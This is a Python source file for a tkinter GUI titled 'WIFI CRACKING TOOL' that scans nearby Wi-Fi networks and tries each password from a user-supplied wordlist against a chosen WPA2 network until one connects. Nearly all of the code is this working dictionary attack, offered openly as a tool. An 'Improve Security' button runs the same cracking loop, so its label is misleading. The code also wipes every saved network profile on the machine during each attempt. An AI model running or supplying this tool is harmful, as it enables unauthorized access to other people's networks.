

from pywifi import const
import time
import tkinter.filedialog  #
import tkinter.messagebox  #

import random
from tkinter import *
from tkinter import ttk
import pywifi

class MY_GUI():
    def __init__(self, init_window_name):
        self.init_window_name = init_window_name
        #
        self.get_value = StringVar()  #
        #
        self.get_wifi_value = StringVar()
        #
        self.get_wifimm_value = StringVar()
        #
        self.wifi = pywifi.PyWiFi()
        #
        self.iface = self.wifi.interfaces()[0]
        #
        self.iface.disconnect()
        time.sleep(1)  #
        #
        assert self.iface.status() in \
               [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]

    def __str__(self):
        #
        return '(WIFI:%s,%s)' % (self.wifi, self.iface.name())

    #
    def set_init_window(self):
        self.init_window_name.title("WIFI CRACKING TOOL")
        self.init_window_name.geometry('+500+200')
        labelframe = LabelFrame(width=400, height=200, text="Menu-Broke WIFI automatically")  # 
        labelframe.grid(column=0, row=0, padx=10, pady=10)
        self.search1 = Label(labelframe, text="Broke WIFI").grid(column=0, row=0)
        self.search = Button(labelframe, text="Searching WiFi", command=self.scans_wifi_list).grid(column=0, row=0)
        self.pojie = Button(labelframe, text="Cracking", command=self.readPassWord).grid(column=1, row=0)
        self.label = Label(labelframe, text="Path：").grid(column=0, row=1)
        self.label1 = Button(labelframe, text="Improve Security", command=self.improvePassWord).grid(column=1, row=0)
        self.path = Entry(labelframe, width=12, textvariable=self.get_value).grid(column=1, row=1)
        self.file = Button(labelframe, text="add pwd txt", command=self.add_mm_file).grid(column=2, row=1)
        self.wifi_text = Label(labelframe, text="WiFiID：").grid(column=0, row=2)
        self.wifi_input = Entry(labelframe, width=12, textvariable=self.get_wifi_value).grid(column=1, row=2)
        self.wifi_mm_text = Label(labelframe, text="WiFiPWD：").grid(column=2, row=2)
        self.wifi_mm_input = Entry(labelframe, width=10, textvariable=self.get_wifimm_value).grid(column=3, row=2,sticky=W)
        self.wifi_labelframe = LabelFrame(text="wifiLIST")
        self.wifi_labelframe.grid(column=0, row=3, columnspan=4, sticky=NSEW)
        #
        self.wifi_tree = ttk.Treeview(self.wifi_labelframe, show="headings", columns=("a", "b", "c", "d"))
        self.vbar = ttk.Scrollbar(self.wifi_labelframe, orient=VERTICAL, command=self.wifi_tree.yview)
        self.wifi_tree.configure(yscrollcommand=self.vbar.set)
        #
        self.wifi_tree.column("a", width=50, anchor="center")
        self.wifi_tree.column("b", width=100, anchor="center")
        self.wifi_tree.column("c", width=100, anchor="center")
        self.wifi_tree.column("d", width=100, anchor="center")
        self.wifi_tree.heading("a", text="WiFiID")
        self.wifi_tree.heading("b", text="SSID")
        self.wifi_tree.heading("c", text="BSSID")
        self.wifi_tree.heading("d", text="signal")
        self.wifi_tree.grid(row=4, column=0, sticky=NSEW)
        self.wifi_tree.bind("<Double-1>", self.onDBClick)
        self.vbar.grid(row=4, column=1, sticky=NS)

    #
    def scans_wifi_list(self):  #
        #
        print("^_^ Start scaning wifi...")
        self.iface.scan()
        time.sleep(9)
        #
        scanres = self.iface.scan_results()
        #
        nums = len(scanres)
        print("Amount: %s" % (nums))
        #
        self.show_scans_wifi_list(scanres)
        return scanres

    #
    def show_scans_wifi_list(self, scans_res):
        for index, wifi_info in enumerate(scans_res):
            self.wifi_tree.insert("", 'end', values=(index + 1, wifi_info.ssid, wifi_info.bssid, wifi_info.signal))

    #
    def add_mm_file(self):
        self.filename = tkinter.filedialog.askopenfilename()
        self.get_value.set(self.filename)

    #
    def onDBClick(self, event):
        self.sels = event.widget.selection()
        self.get_wifi_value.set(self.wifi_tree.item(self.sels, "values")[1])

    #
    def readPassWord(self):
        self.getFilePath = self.get_value.get()
        self.get_wifissid = self.get_wifi_value.get()
        pwdfilehander = open(self.getFilePath, "r", errors="ignore")
        while True:
            try:
                self.pwdStr = pwdfilehander.readline()
                if not self.pwdStr:
                    break
                self.bool1 = self.connect(self.pwdStr, self.get_wifissid)
                if self.bool1:
                    self.res = "[*] pwd correct！wifi：%s，pwd：%s " % (self.get_wifissid, self.pwdStr)
                    self.get_wifimm_value.set(self.pwdStr)
                    tkinter.messagebox.showinfo('attention', 'crack successful！！！')
                    print(self.res)
                    break
                else:
                    self.res = "[*] pwd wrong！wifi:%s，pwd：%s" % (self.get_wifissid, self.pwdStr)
                    print(self.res)
                time.sleep(4)
            except:
                continue

    def improvePassWord(self):
        self.getPath = self.get_value.get()
        self.get_wifissid = self.get_wifi_value.get()
        pwdfilehander = open(self.getPath, "r", errors="ignore")
        while True:
            try:
                self.pwdStr = pwdfilehander.readline()
                if not self.pwdStr:
                    break
                self.bool1 = self.connect(self.pwdStr, self.get_wifissid)
                if self.bool1:
                    self.res = "[*] pwd improve！wifi：%s，pwd：%s " % (self.get_wifissid+"123", self.pwdStr)
                    self.get_wifimm_value.set(self.pwdStr)
                    tkinter.messagebox.showinfo('attention', 'improve successful！！！')
                    print(self.res)
                    break
                else:
                    self.res = "[*] pwd wrong！wifi:%s，pwd：%s" % (self.get_wifissid, self.pwdStr)
                    print(self.res)
                time.sleep(4)
            except:
                continue
    #
    def connect(self, pwd_Str, wifi_ssid):
        # 创建wifi链接文件
        self.profile = pywifi.Profile()
        self.profile.ssid = wifi_ssid  #
        self.profile.auth = const.AUTH_ALG_OPEN  #
        self.profile.akm.append(const.AKM_TYPE_WPA2PSK)  #
        self.profile.cipher = const.CIPHER_TYPE_CCMP  #
        self.profile.key = pwd_Str  #
        self.iface.remove_all_network_profiles()  #
        self.tmp_profile = self.iface.add_network_profile(self.profile)  #
        self.iface.connect(self.tmp_profile)  #
        time.sleep(5)
        if self.iface.status() == const.IFACE_CONNECTED:  #
            isOK = True
        else:
            isOK = False
        self.iface.disconnect()  #
        time.sleep(1)
        #
        assert self.iface.status() in \
               [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]
        return isOK


def gui_start():
    init_window = Tk()
    ui = MY_GUI(init_window)
    print(ui)
    ui.set_init_window()
    init_window.mainloop()


if __name__ == "__main__":
    gui_start()

